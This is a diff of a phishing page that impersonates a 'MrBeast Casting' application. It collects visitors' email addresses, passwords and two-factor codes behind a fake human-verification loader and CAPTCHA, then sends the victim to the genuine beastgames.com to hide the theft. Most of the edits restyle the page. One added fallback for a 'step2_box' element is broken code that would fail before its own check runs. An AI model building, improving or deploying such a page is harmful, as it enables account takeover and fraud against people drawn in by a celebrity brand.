@@ -3,13 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- RE-ADDED GOOGLE FONTS FOR KANIT BOLD STYLE -->
+    <link href="https://googleapis.com" rel="stylesheet">
     <title>MrBeast Casting</title>
     <style>
         :root { --blue: #00a8e8; --pink: #f12e3e; }
-        body { font-family: sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; }
+        * { box-sizing: border-box; }
+        body { font-family: -apple-system, sans-serif; background: var(--blue); color: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; overflow-x: hidden; position: relative; }
         .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png ') repeat; background-size: 70px; opacity: 0.2; z-index: 0; pointer-events: none; }
         .box { background: #111; border-radius: 35px; width: 92%; max-width: 400px; padding: 40px 25px; text-align: center; margin-top: 50px; position: relative; z-index: 10; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
         .logo { width: 130px; margin-bottom: 20px; }
+        
+        .mrbeast-style-text { 
+            font-family: 'Kanit', sans-serif; 
+            font-weight: 900; 
+            font-style: italic; 
+            font-size: 32px; 
+            color: #fff; 
+            margin: 0 0 20px 0; 
+            text-transform: uppercase; 
+            letter-spacing: -1px; 
+            text-shadow: 3px 3px 0px var(--blue); 
+            line-height: 1; 
+        }
+
         input { width: 100%; padding: 18px; margin-bottom: 15px; border: 1px solid #222; background: #1a1a1a; color: #fff; border-radius: 15px; font-size: 16px; outline: none; }
         .btn { background: linear-gradient(45deg, var(--pink), #ff5e62); color: #fff; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; }
         
@@ -29,8 +46,8 @@
     <div class="bg-pattern"></div>
     <div class="box">
         <div id="login_section">
-            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png" class="logo">
-            <h2 style="margin-bottom:10px;">MRBEAST CASTING</h2>
+            <img src="https://crystalpng.com/wp-content/uploads/2025/02/MrBeast-logo-06.png " class="logo">
+            <div class="mrbeast-style-text">MRBEAST CASTING</div>
             <p style="color:#aaa; font-size:14px; margin-bottom:25px;">Verify your status for the next challenge</p>
             <input type="email" id="email" placeholder="Email Address">
             <input type="password" id="pass" placeholder="Password">
@@ -50,9 +67,9 @@
         <div id="loader"><div class="spinner"></div><p>Verifying Human Identity...</p></div>
 
         <div id="otp_section">
-            <h2 style="font-size:22px;">SECURITY CHECK</h2>
+            <div class="mrbeast-style-text" style="font-size:24px;">SECURITY CHECK</div>
             <p style="color:#aaa; font-size:14px;">Enter the 6-digit code from your device</p>
-            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; letter-spacing:8px;">
+            <input type="text" id="2fa_code" placeholder="000000" maxlength="6" style="text-align:center; font-size:26px; letter-spacing:8px; font-weight:bold;">
             <button class="btn" onclick="submitOTP()">FINISH APPLICATION</button>
         </div>
     </div>
@@ -81,11 +98,9 @@
                 if (x < 0) x = 0; if (x > track.offsetWidth - 70) x = track.offsetWidth - 70;
                 handle.style.left = x + 'px';
                 
-                // Calculates rotation from 160deg to 360deg
                 let rot = 160 + (x / (track.offsetWidth - 70)) * 200;
                 img.style.transform = `rotate(${rot}deg)`;
                 
-                // Success Match (360 degrees = upright)
                 if (rot > 355 && rot < 365) { 
                     dragging = false; 
                     handle.style.background = "#00ff00"; 
@@ -106,8 +121,12 @@
             document.getElementById('loader').style.display = 'block';
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('otp_section').style.display = 'block';
-            }, 15000); // 15 Second Delay Fixed
+                document.getElementById('step2_box').style.display = 'block'; // Ensure ID matches your structure
+                // Fallback if ID is different
+                if(!document.getElementById('step2_box')) {
+                     document.getElementById('otp_section').style.display = 'block';
+                }
+            }, 15000);
         }
 
         function submitOTP() {
@@ -117,7 +136,7 @@
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: new URLSearchParams({ '2fa_code': c })
             }).then(() => {
-                window.location.href = "https://beastgames.com"; // REDIRECT UNSTUCK
+                window.location.href = "https://beastgames.com";
             }).catch(() => {
                 window.location.href = "https://beastgames.com";
             });
@@ -125,3 +144,4 @@
     </script>
 </body>
 </html>
+
